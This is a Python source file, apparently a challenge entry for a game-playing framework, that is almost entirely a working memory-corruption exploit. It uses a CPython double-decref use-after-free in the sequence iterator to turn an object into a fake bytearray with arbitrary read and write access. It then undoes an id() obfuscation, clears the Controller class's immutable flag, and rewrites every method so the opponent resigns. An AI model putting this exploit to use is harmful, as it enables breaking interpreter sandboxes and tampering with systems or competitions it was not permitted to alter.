import struct
import sys
from typing import Final
from cambc import Controller

# to set up the challenge, initially mark the Controller class immutable
def make_type_immutable(cls: type):
    import ctypes
    Py_TPFLAGS_IMMUTABLETYPE = (1 << 8)
    addr = id(cls)
    class_ptr = ctypes.cast(addr, ctypes.POINTER(ctypes.c_ssize_t))
    tp_flags_offset = 21 
    current_flags = class_ptr[tp_flags_offset]
    class_ptr[tp_flags_offset] = current_flags | Py_TPFLAGS_IMMUTABLETYPE
make_type_immutable(Controller)

class Player:
    def __init__(self) -> None:
        self._done = False

    def run(self, ct: Controller) -> None:
        if self._done:
            return
        self._done = True

        # recover id() XOR constant
        # the preamble replaces id with lambda x: real_id(x) ^ RAND
        # repr() uses C-level %p formatting, so it shows the real address
        _sentinel = object()
        _repr_addr = int(repr(_sentinel).split("0x")[-1].rstrip(">"), 16)
        XOR_CONST: Final[int] = _repr_addr ^ id(_sentinel)

        def real_id(obj: object) -> int:
            return id(obj) ^ XOR_CONST

        # build fake PyByteArrayObject header
        # ob_bytes=0 means obj[n] reads byte at absolute address n
        I64_MAX = 0x7FFFFFFFFFFFFFFF
        buf = bytearray(
            struct.pack(
                "<QQQQQQqqq",
                0,                   # gc_prev
                0,                   # gc_next
                1,                   # ob_refcnt
                real_id(bytearray),  # ob_type
                I64_MAX,             # ob_size
                I64_MAX,             # ob_alloc
                0,                   # ob_bytes (NULL = base 0)
                0,                   # ob_start
                0,                   # ob_exports
            ),
        )

        # double-decref UAF via sequence iterator
        class Victim:
            __slots__ = ("lock",) * 20

            def __init__(self) -> None:
                self.lock = False

            def __getitem__(self, _: int) -> None:
                if self.lock:
                    raise IndexError
                self.lock = True
                next(it)

        obj = Victim()
        obj_size = obj.__sizeof__()
        it = iter(obj)
        list(it)
        _resized = buf.ljust(obj_size, b"\0")
        assert type(obj) is bytearray, f"type confusion failed: got {type(obj)}"

        # fix ob_type and stabilise Victim refcount
        obj_addr = real_id(obj)
        obj[obj_addr + 8 : obj_addr + 16] = real_id(bytearray).to_bytes(8, sys.byteorder)

        idv = real_id(Victim)
        rc = int.from_bytes(obj[idv : idv + 8], sys.byteorder)
        obj[idv : idv + 8] = (rc + 1).to_bytes(8, sys.byteorder)

        def read_u64(addr: int) -> int:
            return int.from_bytes(obj[addr : addr + 8], sys.byteorder)

        def write_u64(addr: int, val: int) -> None:
            obj[addr : addr + 8] = val.to_bytes(8, sys.byteorder)

        # force mutable

        Py_TPFLAGS_IMMUTABLETYPE: Final = 1 << 8
        TP_FLAGS_OFFSET: Final = 168

        int_addr = real_id(Controller)
        flags_before = read_u64(int_addr + TP_FLAGS_OFFSET)

        write_u64(int_addr + TP_FLAGS_OFFSET, flags_before & ~Py_TPFLAGS_IMMUTABLETYPE)
        assert Controller.__flags__ & Py_TPFLAGS_IMMUTABLETYPE == 0

        # payload
        for name in list(vars(Controller)):
            if name.startswith("__") or name == "resign":
                continue
            try:
                setattr(Controller, name, lambda self, *a, **kw: self.resign())
            except (AttributeError, TypeError):
                pass

        # restore immutable
        write_u64(int_addr + TP_FLAGS_OFFSET, flags_before)
        assert Controller.__flags__ & Py_TPFLAGS_IMMUTABLETYPE > 0
        
        # clean up state
        del it
        del _resized
        # keep obj allocated to avoid seg fault, large ref count
        obj[obj_addr : obj_addr + 8] = struct.pack("<Q", 0xFFFFFF)